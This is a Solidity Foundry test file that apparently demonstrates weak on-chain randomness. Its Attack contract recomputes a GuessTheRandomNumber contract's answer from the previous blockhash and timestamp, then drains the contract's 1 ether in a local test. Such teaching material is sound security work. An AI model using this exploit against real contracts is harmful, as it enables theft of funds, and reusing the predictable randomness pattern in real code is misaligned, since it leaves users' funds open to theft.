// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "../src/GuessTheRandomNumber.sol";

contract Attack {
    receive() external payable {}

    function attack(GuessTheRandomNumber guessTheRandomNumber) public {
        uint answer = uint(
            keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))
        );

        guessTheRandomNumber.guess(answer);
    }

    // Helper function to check balance
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}


contract GuessTheRandomNumberTest is Test {
    uint256 public privateKey = 1234;
    address public signer;
    GuessTheRandomNumber public guessTheRandomNumber;
    address public exploiter = vm.addr(3333);
    function setUp() public {
        signer = vm.addr(privateKey);
        vm.deal(signer, 1 ether);
        vm.startPrank(signer);
        guessTheRandomNumber = new GuessTheRandomNumber{value: 1 ether}();
        vm.stopPrank();
    }

    function test_guess_number() public {
        vm.startPrank(exploiter);
        Attack attack = new Attack();
        attack.attack(guessTheRandomNumber);
        assertEq(address(attack).balance, 1 ether);
    }
}